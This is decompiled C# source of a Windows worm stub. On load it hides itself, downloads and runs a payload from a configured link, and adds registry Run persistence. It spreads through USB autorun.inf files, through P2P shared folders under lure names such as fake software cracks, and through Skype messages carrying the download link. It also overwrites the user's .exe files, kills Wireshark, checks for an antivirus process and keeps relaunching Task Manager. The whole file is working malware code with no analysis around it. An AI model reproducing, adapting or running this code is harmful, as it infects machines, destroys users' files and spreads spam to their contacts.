using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Worm_Stub.My;

namespace Worm_Stub;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	private const string FileSplit = "---MARIJUANA!@#$!%@#$@%---";

	private string self;

	private string[] Settings;

	private bool usbtrueorfalse;

	private string DownloadLink;

	private object Devices;

	private string Grafikadapter;

	private string RegionA;

	private string id;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		RegionA = "SELECT * FROM Win32_VideoController";
		id = "76487-337-8429955-22614";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 262);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).Hide();
		Stub stub = new Stub();
		string[] parameters = stub.GetParameters(Application.get_ExecutablePath());
		DownloadLink = parameters[0];
		downloader();
		AddStartup();
		if (Operators.CompareString(parameters[1], "True", false) == 0)
		{
			usb_spreader();
		}
		if (Operators.CompareString(parameters[2], "True", false) == 0)
		{
			antis();
		}
		if (Conversions.ToBoolean(parameters[3]) && File.Exists(Interaction.Environ("appdata") + "\\google.exe"))
		{
			P2P(Interaction.Environ("appdata") + "\\google.exe");
		}
		if (Conversions.ToBoolean(parameters[4]))
		{
			exe();
		}
		if (Conversions.ToBoolean(parameters[5]))
		{
			tsk();
		}
		if (Conversions.ToBoolean(parameters[6]))
		{
			skype();
		}
		if (Conversions.ToBoolean(parameters[7]))
		{
			lan();
		}
	}

	public void lan()
	{
		try
		{
			IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
			hostAddresses[0].ToString();
			Dns.GetHostEntry("workgroup");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), "workgroup");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void skype()
	{
		try
		{
			Process.Start("C:\\Program Files (x86)\\Skype\\Phone");
			FileStream stream = new FileStream(Interaction.Environ("appdata") + "sc4.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine("on error resume next");
			streamWriter.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
			streamWriter.WriteLine("Fruxr.Client.Start()");
			streamWriter.WriteLine("Fruxr.Attach()");
			streamWriter.WriteLine("For Each KZN In Fruxr.Friends");
			streamWriter.WriteLine("Fruxr.SendMessage KZN.handle,\"Get this. Don't even ask questions, There's no time!! $285 program, year subscription of skype FREE! " + DownloadLink + "\"");
			streamWriter.WriteLine("next");
			streamWriter.Close();
			Process.Start(Interaction.Environ("appdata") + "sc4.vbs");
			new FileInfo(Interaction.Environ("appdata") + "sc4.vbs");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void exe()
	{
		try
		{
			string[] files = Directory.GetFiles(Interaction.Environ("userprofile"), "*.exe", SearchOption.TopDirectoryOnly);
			string[] files2 = Directory.GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop(), "*.exe", SearchOption.TopDirectoryOnly);
			string[] array = files;
			foreach (string text in array)
			{
				File.Delete(text);
				FileSystem.FileCopy(Interaction.Environ("appdata") + "\\google.exe", text);
			}
			string[] array2 = files2;
			foreach (string text2 in array2)
			{
				File.Delete(text2);
				FileSystem.FileCopy(Interaction.Environ("appdata") + "\\google.exe", text2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void P2P(string filepath)
	{
		string[] array = new string[17];
		string text = "C:\\Program Files";
		array[0] = text + "\\KMD\\My Shared Folder\\";
		array[1] = text + "\\KMD\\My Shared Folder\\";
		array[2] = text + "\\KaZaA Lite\\My Shared Folder\\";
		array[3] = text + "\\Bear Share\\Shared\\";
		array[4] = text + "\\LimeWire\\Shared\\";
		array[5] = text + "\\mirc32\\";
		array[6] = text + "\\kazaa\\my shared folder\\";
		array[7] = text + "\\kazaa lite k&&\\my shared folder\\";
		array[8] = text + "\\icq\\shared folder\\";
		array[9] = text + "\\grokster\\my grokster\\";
		array[10] = text + "\\edonkey2000\\incoming\\";
		array[11] = text + "\\emule\\incoming\\";
		array[12] = text + "\\tesla\\files\\";
		array[13] = text + "\\Ares\\My Shared Folder\\";
		array[14] = text + "\\winmx\\shared\\";
		array[15] = text + "\\apex\\shared";
		string[] array2 = new string[8];
		string text2 = ".exe";
		array2[0] = "Windows 7 (x86/x64) WGA/WAT crack" + text2;
		array2[1] = "Photoshop CS5 updatable&crack&keygen" + text2;
		array2[2] = "World Of Warcraft unlimited premium crack updatable" + text2;
		array2[3] = "Office 2011 cracked" + text2;
		array2[4] = "Avira latest updatable cracked&keygen" + text2;
		array2[5] = " Free Anti Virus " + text2;
		array2[6] = " Free porn" + text2;
		string[] array3 = array;
		foreach (string text3 in array3)
		{
			string[] array4 = array2;
			foreach (string text4 in array4)
			{
				try
				{
					FileSystem.FileCopy(filepath, text3 + text4);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public object antis()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		object obj = default(object);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					obj = ((Process.GetProcessesByName("avp").Length < 1) ? ((object)false) : ((object)true));
					goto end_IL_0001;
				case 127:
					num = -1;
					switch (num2)
					{
					case 2:
					{
						ProjectData.EndApp();
						Process[] processes = Process.GetProcesses();
						Process[] array = processes;
						foreach (Process process in array)
						{
							string mainWindowTitle = process.MainWindowTitle;
							if (string.Equals(mainWindowTitle, "The Wireshark Network Analyzer"))
							{
								process.Kill();
							}
						}
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					}
					break;
				}
				goto IL_00b9;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 127;
				continue;
			}
			break;
			IL_00b9:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		object result = obj;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void tsk()
	{
		try
		{
			int processId = Interaction.Shell("taskmgr.exe", (AppWinStyle)0, false, -1);
			while (true)
			{
				Process.GetProcessById(processId).WaitForExit();
				Thread.Sleep(50);
				processId = Interaction.Shell("taskmgr.exe", (AppWinStyle)0, false, -1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void downloader()
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(((Control)this).get_Name(), Interaction.Environ("appdata") + "\\google.exe", RegistryValueKind.String);
		if (File.Exists(Interaction.Environ("appdata") + "\\google.exe"))
		{
			File.Delete(Interaction.Environ("appdata") + "\\google.exe");
		}
		if (File.Exists(Interaction.Environ("temp") + "\\java.exe"))
		{
			File.Delete(Interaction.Environ("temp") + "\\java.exe");
		}
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(DownloadLink, Interaction.Environ("appdata") + "\\google.exe");
		Process.Start(Interaction.Environ("appdata") + "\\google.exe");
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(DownloadLink, Interaction.Environ("temp") + "\\java.exe");
		Process.Start(Interaction.Environ("temp") + "\\java.exe");
	}

	public void AddStartup()
	{
		string name = "java";
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string startupPath = Application.get_StartupPath();
		try
		{
			registryKey.SetValue(name, startupPath, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void usb_spreader()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		int num5 = default(int);
		string[] logicalDrives = default(string[]);
		int num6 = default(int);
		DriveInfo driveInfo = default(DriveInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num7;
				int num8;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					goto IL_0004;
				case 723:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0004;
						case 3:
							goto IL_0007;
						case 4:
							goto IL_000a;
						case 5:
							goto IL_000d;
						case 6:
							goto IL_0010;
						case 7:
							goto IL_0013;
						case 8:
							goto IL_0016;
						case 9:
							goto IL_0019;
						case 10:
							goto IL_001d;
						case 11:
							goto IL_0021;
						case 12:
							goto IL_0025;
						case 13:
							goto IL_0029;
						case 14:
							goto IL_002d;
						case 15:
							goto IL_0031;
						case 16:
							goto IL_0035;
						case 17:
							goto IL_0039;
						case 18:
							goto IL_003d;
						case 19:
							goto IL_0041;
						case 20:
							goto IL_0045;
						case 21:
							goto IL_0049;
						case 22:
							goto IL_004d;
						case 23:
							goto IL_0051;
						case 24:
							goto IL_0055;
						case 25:
							goto IL_0059;
						case 26:
							goto IL_005d;
						case 27:
							goto IL_0061;
						case 28:
							goto IL_0065;
						case 29:
							goto IL_0069;
						case 30:
							goto IL_006d;
						case 31:
							goto IL_0071;
						case 32:
							goto IL_0075;
						case 33:
							goto IL_0079;
						case 34:
							goto IL_007d;
						case 35:
							goto IL_0081;
						case 36:
							goto IL_0085;
						case 37:
							goto IL_0089;
						case 38:
							goto IL_008d;
						case 39:
							goto IL_0091;
						case 40:
							goto IL_0095;
						case 41:
							goto IL_0099;
						case 42:
							goto IL_009d;
						case 43:
							goto IL_00a1;
						case 44:
							goto IL_00a5;
						case 45:
							goto IL_00a9;
						case 46:
							goto IL_00b2;
						case 47:
							goto IL_00bd;
						case 48:
							goto IL_00d9;
						case 49:
							goto IL_00e9;
						case 50:
							goto IL_00fc;
						case 51:
							goto IL_010c;
						case 52:
							goto IL_012c;
						case 53:
							goto IL_014f;
						case 54:
							goto IL_018b;
						case 55:
							goto IL_01a4;
						case 56:
						case 57:
						case 58:
						case 59:
							goto IL_01bd;
						default:
							goto end_IL_0001;
						case 60:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_01bd:
					num = 59;
					num5 = checked(num5 + 1);
					goto IL_00cc;
					IL_01a4:
					num = 55;
					FileSystem.SetAttr(logicalDrives[num5] + "autorun.inf", (FileAttribute)2);
					goto IL_01bd;
					IL_0004:
					num = 2;
					goto IL_0007;
					IL_0007:
					num = 3;
					goto IL_000a;
					IL_000a:
					num = 4;
					goto IL_000d;
					IL_000d:
					num = 5;
					goto IL_0010;
					IL_0010:
					num = 6;
					goto IL_0013;
					IL_0013:
					num = 7;
					goto IL_0016;
					IL_0016:
					num = 8;
					goto IL_0019;
					IL_0019:
					num = 9;
					goto IL_001d;
					IL_001d:
					num = 10;
					goto IL_0021;
					IL_0021:
					num = 11;
					goto IL_0025;
					IL_0025:
					num = 12;
					goto IL_0029;
					IL_0029:
					num = 13;
					goto IL_002d;
					IL_002d:
					num = 14;
					goto IL_0031;
					IL_0031:
					num = 15;
					goto IL_0035;
					IL_0035:
					num = 16;
					goto IL_0039;
					IL_0039:
					num = 17;
					goto IL_003d;
					IL_003d:
					num = 18;
					goto IL_0041;
					IL_0041:
					num = 19;
					goto IL_0045;
					IL_0045:
					num = 20;
					goto IL_0049;
					IL_0049:
					num = 21;
					goto IL_004d;
					IL_004d:
					num = 22;
					goto IL_0051;
					IL_0051:
					num = 23;
					goto IL_0055;
					IL_0055:
					num = 24;
					goto IL_0059;
					IL_0059:
					num = 25;
					goto IL_005d;
					IL_005d:
					num = 26;
					goto IL_0061;
					IL_0061:
					num = 27;
					goto IL_0065;
					IL_0065:
					num = 28;
					goto IL_0069;
					IL_0069:
					num = 29;
					goto IL_006d;
					IL_006d:
					num = 30;
					goto IL_0071;
					IL_0071:
					num = 31;
					goto IL_0075;
					IL_0075:
					num = 32;
					goto IL_0079;
					IL_0079:
					num = 33;
					goto IL_007d;
					IL_007d:
					num = 34;
					goto IL_0081;
					IL_0081:
					num = 35;
					goto IL_0085;
					IL_0085:
					num = 36;
					goto IL_0089;
					IL_0089:
					num = 37;
					goto IL_008d;
					IL_008d:
					num = 38;
					goto IL_0091;
					IL_0091:
					num = 39;
					goto IL_0095;
					IL_0095:
					num = 40;
					goto IL_0099;
					IL_0099:
					num = 41;
					goto IL_009d;
					IL_009d:
					num = 42;
					goto IL_00a1;
					IL_00a1:
					num = 43;
					goto IL_00a5;
					IL_00a5:
					num = 44;
					goto IL_00a9;
					IL_00a9:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_00b2;
					IL_00b2:
					num = 46;
					logicalDrives = Environment.GetLogicalDrives();
					goto IL_00bd;
					IL_00bd:
					num = 47;
					num6 = checked(logicalDrives.Length - 1);
					num5 = 0;
					goto IL_00cc;
					IL_00cc:
					num7 = num5;
					num8 = num6;
					if (num7 > num8)
					{
						goto end_IL_0001_2;
					}
					goto IL_00d9;
					IL_00d9:
					num = 48;
					driveInfo = new DriveInfo(logicalDrives[num5]);
					goto IL_00e9;
					IL_00e9:
					num = 49;
					if (driveInfo.DriveType == DriveType.Removable)
					{
						goto IL_00fc;
					}
					goto IL_01bd;
					IL_00fc:
					num = 50;
					if (driveInfo.IsReady)
					{
						goto IL_010c;
					}
					goto IL_01bd;
					IL_010c:
					num = 51;
					if (!File.Exists(logicalDrives[num5] + "autorun.exe"))
					{
						goto IL_012c;
					}
					goto IL_01bd;
					IL_012c:
					num = 52;
					File.Copy(Interaction.Environ("appdata") + "\\google.exe", Conversions.ToString(true));
					goto IL_014f;
					IL_014f:
					num = 53;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(logicalDrives[num5] + "autorun.inf", "[autorun]\r\nopen=" + logicalDrives[num5] + "autorun.exe\r\nshellexecute=" + logicalDrives[num5], true);
					goto IL_018b;
					IL_018b:
					num = 54;
					FileSystem.SetAttr(logicalDrives[num5] + "autorun.exe", (FileAttribute)2);
					goto IL_01a4;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 723;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
